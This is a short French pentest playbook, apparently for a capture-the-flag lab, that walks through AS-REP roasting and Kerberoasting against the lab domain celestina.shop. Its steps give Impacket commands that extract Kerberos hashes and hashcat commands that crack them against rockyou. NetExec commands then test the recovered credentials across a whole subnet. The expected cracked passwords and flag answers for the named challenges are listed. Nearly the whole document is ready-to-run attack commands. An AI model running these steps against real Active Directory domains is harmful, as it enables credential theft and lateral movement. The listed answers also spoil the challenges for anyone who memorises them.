# Playbook 03 — AS-REP & Kerberoasting

> Runbook étapes 25–35 | Challenges : *Un café vraiment pas sécurisé*, *CAAS*

## Variables

```bash
export DC_IP=10.13.37.42
export DOMAIN=celestina.shop
export USER=pentester
export PASS='Password123!'
```

---

### Étape 1 — AS-REP Roasting (export hash)

```bash
GetNPUsers.py celestina.shop/pentester:'Password123!' -request -format hashcat -dc-ip 10.13.37.42 -outputfile asrep.txt
cat asrep.txt
```

**Résultat attendu** : ligne `$krb5asrep$23$...` (ex. utilisateur **j.vabre**).

---

### Étape 2 — Casser AS-REP (hashcat)

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.txt --show
```

**Résultat attendu (TP blanc)** : `j.vabre` → **Coffee4me!**

**Journal** : soumettre flag *Un café vraiment pas sécurisé* si validé sur plateforme.

---

### Étape 3 — Kerberoasting (export TGS)

```bash
GetUserSPNs.py celestina.shop/pentester:'Password123!' -request -dc-ip 10.13.37.42 -outputfile kerb.txt
cat kerb.txt
```

**Résultat attendu** : hashs pour **g.clooney**, **k.cedepte** (SPN).

---

### Étape 4 — Casser Kerberoast

```bash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb.txt --show
```

**Résultat attendu (TP blanc)** : `g.clooney` → **CoffeeMug!1** (k.cedepte souvent non cracké → voir playbook 04 description).

---

### Étape 5 — Valider j.vabre sur le réseau

```bash
nxc smb 10.13.37.0/24 -u 'j.vabre' -p 'Coffee4me!' --continue-on-success
```

---

### Étape 6 — Valider g.clooney sur le réseau

```bash
nxc smb 10.13.37.0/24 -u 'g.clooney' -p 'CoffeeMug!1' --continue-on-success
```

---

### Étape 7 — Script tout-en-un (optionnel)

```bash
bash scripts/roast-and-crack.sh
```
